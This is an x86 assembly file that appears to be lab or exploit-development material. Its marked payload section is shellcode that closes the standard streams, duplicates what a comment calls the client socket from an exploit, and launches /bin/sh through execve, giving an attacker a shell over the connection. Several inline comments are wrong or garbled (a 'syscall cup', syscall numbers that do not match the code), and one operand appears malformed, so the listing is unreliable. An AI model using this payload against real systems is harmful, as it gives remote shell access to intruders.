.file	"test.c"
	.text
.globl function
	.type	function, @function
function:
	pushl	%ebp
	movl	%esp, %ebp


	#PAYLOAD_START

	jmp 	L1			# Jumping to L1
	L2: 				

	xorl 	%eax, %eax		# Set %eax to 0
	xorl	%ebx, %ebx		# Set %ebx to 0

					# Closing stdin

	movb	%al, %bl		# Set %eax lowest byte to 6 (syscall close)
	movb	$0x6, %al		# Jump to kernel mode
	int	$0x80

					# Closing stdout

	movb	$0x1, %bl		# Set %ebx lowest byte to 1
	movb	$0x6, %al		# Set %eax lowest byte to 6 (syscall close)
	int	$0x80			# Jump to kernel mode

					# Closing stderr

	movb 	$0x2, %bl		# Set %ebx lowest byte to 1
	movb 	$0x6, %al		# Set %eax lowest byte to 6 (syscall close)
	int 	$0x80			# Jump to kernel mode

					# Duplicating socket

	movb	$0x3, %bl		# Set %ebx lowest byte to 3 (will be replaced by client socket in exploit)
	movb	$0x29, %al		# Set %eax lowest byte to 6 (syscall cup)
	int	$0x80			# Jump to kernel mode

	movb	$0x29, %al		# Set %eax lowest byte to 6 (syscall cup)
	int	$0x80			# Jump to kernel mode

	movb	$0x29, %al		# Set %eax lowest byte to 6 (syscall cup)
	int	$0x80			# Jump to kernel mode

					# Call to execve, invoking /bin/sh

	popl 	%esi			# Address of /bin/sh now in %esi
	xorl 	%eax, %eax		# NULL in %eax
	movb 	%al, x7(%esi)		# NULL terminate /bin/sh
	push 	%eax			# NULL after pointer below
	push 	%esi			# Create pointer to array

	xorl	%edx, %edx		# NULL in %edx
	movl	%esp, %ecx		# Address of array in %ecx
	movl	%esi, %ebx		# Address of /bin/sh in %ebx
	movb	$0xb, %al		# Set up for execve call in %eax
	int	$0x80			# Jump to kernel mode

	L1: call L2
	.string "/bin/sh"

	#PAYLOAD_END

	popl	%ebp
	ret
	.size	function, .-function
.globl main
	.type	main, @function
main:
	pushl	%ebp
	movl	%esp, %ebp
	call	function
	movl	$0, %eax
	popl	%ebp
	ret
	.size	main, .-main
	.ident	"GCC: (GNU) 4.4.7 20120313 (Red Hat 4.4.7-17)"
	.section	.note.GNU-stack,"",@progbits
